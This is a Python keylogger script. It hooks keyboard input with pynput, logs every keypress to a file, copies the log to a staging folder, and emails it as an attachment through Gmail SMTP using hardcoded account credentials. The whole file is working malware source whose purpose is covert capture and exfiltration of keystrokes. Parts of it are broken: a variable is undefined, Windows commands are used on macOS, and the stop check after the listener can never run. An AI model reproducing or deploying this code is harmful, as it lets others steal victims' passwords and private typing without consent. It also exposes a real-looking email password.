from pynput.keyboard import Key, Listener
import logging
import shutil
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
import socket
import datetime
import keyboard  
import getpass


def start():
    ###########################################################################################
    timing = datetime.datetime.now()
    name_pc = socket.gethostname()
    print(name_pc)
    print(timing)
    os32=str(sys.platform)
def email():
    timing = datetime.datetime.now()
    name_pc = socket.gethostname()
    print(name_pc)
    print(timing)
    os32=str(sys.platform)
    email = 'loggintest53@gmail.com'
    password = 'ht1234567890'
    send_to_email = 'loggintest53@gmail.com'
    subject = 'This is the subject: '+str(name_pc)+' '+str(timing)
    message = 'This is my message pc: '+str(name_pc)+' '+str(timing)
    if  os32 == 'win32':
        file_location = 'C:\loop1\send.txt'
    if os32 == 'darwin':
        file_location = '~/Documents/loop1/send.txt'
            
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = send_to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, send_to_email, text)
    server.quit()
def s():
    ###########################################################
    dir_path = os.path.dirname(os.path.realpath(__file__))
    print(dir_path + "log_results.txt")
    shutil.copyfile('log_results.txt', 'log.txt')  
    if  os32 == 'win32':
        exists = os.path.isfile('C:\loop1\send.txt')
        if exists:
            os.system('copy log.txt C:\loop1\send.txt')
            print('existed')
        else:
            os.system('mkdir c:\loop1')
            print('not existed')
        print(os32)
        os.system('copy log.txt C:\loop1\send.txt')

        
    if os32 == 'darwin':
        exists = os.path.isfile('~/Documents/loop1/send.txt')
        if exists:
            os.system('copy log.txt ~/Documents/loop1/send.txt')
        else:
            os.system('mkdir ~/Documents/loop1')
        print(os32)
        os.system('copy log.txt ~/Documents/loop1/send.txt')
    ###################################################################


def logger3():
    while True:
        log_directory = ""
        logging.basicConfig(filename = (log_directory + "log_results.txt"), level = logging.DEBUG, format = '%(asctime)s : %(message)s')
        def keypress(Key):

            logging.info(str(Key))

        with Listener(on_press = keypress) as listener:
            listener.join()
            import keyboard
            if keyboard.is_pressed('$'):
                break
        
